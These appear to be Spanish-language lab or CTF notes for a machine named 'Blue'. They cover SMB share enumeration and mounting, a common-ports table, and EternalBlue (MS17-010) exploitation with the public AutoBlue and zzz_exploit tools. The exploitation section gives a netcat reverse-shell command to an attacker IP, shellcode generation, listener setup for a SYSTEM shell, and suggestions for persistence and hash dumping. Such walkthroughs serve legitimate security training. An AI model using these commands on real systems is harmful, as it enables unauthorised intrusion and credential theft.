# MAQUINA BLUE

## PUERTOS ALTOS NO INTERESANTES (NO SE PUEDE EXPLOTARLOS)

49152-49153-49154-49155-4915249156-49157

## EXPLOTACION POR SAMBA 

Puerto 445

si vemos que esta el servicio samba abierto usamos lo siguiente para enumerar:

smbmap para ver los recursos compartidos

```
smbmap -H <ip-victima>
```

en caso de dar access deny, intentamos autenticarnos con un null sesion:

```
smbmap -H <ip-victima> -u 'null'
```

otra forma de ver es con sambaclient:

```
smbclient -L <ip-victima>

con null sesion

smbclient -L <ip-victima> -N
```

autenticarnos sobre un recurso compartido

```
smbclient -L <ip-victima>/carpetadelrecursocompartido -N
```


en caso de ser una maquina windows 7 con el samba abierto se tiene el famoso ataque de ethernalblue (MS17-010), existe un script de nmap para verificar si es vulnerable para este ataque

```
nmap --script "vuln and safe" -p445 <ip-victima> -oN vulnScan
```

## common windows port

Port	Service name	Transport protocol
 20,21	 File Transfer Protocol (FTP)	 TCP
 22	 Secure Shell (SSH)	 TCP and UDP
 23	 Telnet	 TCP
 25	 Simple Mail Transfer Protocol (SMTP)	 TCP
 50,51	 IPSec	 
 53	 Domain Name System (DNS)	 TCP and UDP
 67,68	 Dynamic Host Configuration Protocol (DHCP)	 UDP
 69	 Trivial File Transfer Protocol (TFTP)	 UDP
 80	 HyperText Transfer Protocol (HTTP)	 TCP
 110	 Post Office Protocol (POP3)	 TCP
 119	 Network News Transport Protocol (NNTP)	 TCP
 123	 Network Time Protocol (NTP)	 UDP
 135-139	 NetBIOS	 TCP and UDP
 143	 Internet Message Access Protocol (IMAP4)	 TCP and UDP
 161,162	 Simple Network Management Protocol (SNMP)	 TCP and UDP
 389	 Lightweight Directory Access Protocol	 TCP and UDP
 443	 HTTP with Secure Sockets Layer (SSL)	 TCP and UDP
 989,990	 FTP over SSL/TLS (implicit mode)	 TCP
 3389	 Remote Desktop Protocol	 TCP and UDP


## LEER MAS RAPIDO EL CONTENIDO COMPARTIDO DE UN SAMBA A TRAVES DE
MOUNT

una vez que nos autenticamos en un seridor samba a traves de smbmap o smbclient podemos traer una montura de todo el contenido al que tenemos acceso a la maquina atacante (parrot) para una mejor movilidad.

Es como traerse todos los archivos y carpetas a la maquina, no es eso lo que sucede en realidad solo es una montura

nos dirigimos a la ruta /mnt y nos creamos una carpeta de referenciaen la maquina atacante:

```
cd /mnt
mkdir contenidoSamba
```

montamos el recursocompartido en la carpeta creada

```
mount -t cifs //<ip-victima>/recursoCompartido /mnt/contenidoSamba -o username=null,password=null,domain=WORKGROUP,rw
```

en caso de no ser un null session ponemos las credenciales en usuarname y password.
El rw es el modo lectura y escritura

Con eso ya se nos creara una montura de todo el recurso compartido en nuestra maquina para poder analizar mejor

**para ver los permisos de los archivos**

el ls -l no mustra los permisos reales de los archivos, se debe hacer uso de "smbcacls"

mediante bash podemos grepear para ver los permisos de manera mas clara

```
smbcacls //<ip-victima>/recursoCompartido carpeta/subcarpeta -N

-N en caso de ser una null session
-u y -p caso contrario especificando usuario o contrase√±a

```

podemos crear una forma recursiva de hacer esto por su hay muchas carpetas y subcarpetas

```
for file in $(ls);do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line \n"; smbcacls //<ip-victima>/recursoCompartido CarpetaRaiz/$line -N | grep -i "everyone"; done
```

Esto nos mostrara por carpeta y de manera recursiva los permisos que tenemos segun el fichero o carpeta

para quitar la montura hacemos lo siguiente:

```
umount /mnt/contenidoSamba
```

## EXPLOTACION DE UN ETERNAL BLUE

exploits:

autoblue [https://github.com/3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

zzz_exploit [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)


**zzz_exploit**

una vez clonado el repo, contiene un checker para el ethernal blue

```
python checker.py <ip-victima>
```

Basta que un named pipe diga "ok" y listo podemos aplicar el exploit con ese named pipe

para usar este exploit debemos modificar el zzz_exploit.py, comentar el contenido de la funcion "smb_pwn" y solo descomentar las siguientes lineas

```
smbConn = conn.get_smbconnection()
service_exec(conn,r'cmd /c <comando-del-atacante>')

EJ: \\<ip-atacante>\sambaFolder\nc.exe -e cmd <ip-atacante> 4646
```

a la hora de ejecutar este script, ejecutara el comando
esto es valido si algun named pipe da "ok"

**autoblue**

En caso de no dar el zzz_exploit

tiene un checker tambien:

```
python ethernal_checker.py <ip-victima>
```

primero debemos generar un shellcode

```
cd shellcode

./shell_prep.sh

Y

<ip-atacante>

<puerto> para 64 bits

<puerto> para 32 bits

1

1
```

Con esto se crea el shellcode "sc_all.bin", sirve para 32 y 64 bits por lo que antes de ejecutar el exploit nos debemos poner a la escucha en dos netcats, uno con el puerto definido para 32 bits y otro para 64 bits

```
32 bits
rlwrap nc -nlvp <puerto-32-bits>

64 bits
rlwrap nc -nlvp <puerto-64-bits>
```

Ejecutamos el exploit autoblue

en caso de ser windows 7

```
python ethernalblue_exploit7.py <ip_victima> shellcode/sc_all.bin
```

en caso de ser windows 10

```
python ethernalblue_exploit10.py <ip_victima> shellcode/sc_all.bin
```

Y en uno de los escucha de netcat debe aparecer un cmd como NT-AUTORITY/SYSTEM

Ahora podemos crearnos una persistencia creando un usuario coomo administrador y despues tratar de dumpear hashes con crackmapexec



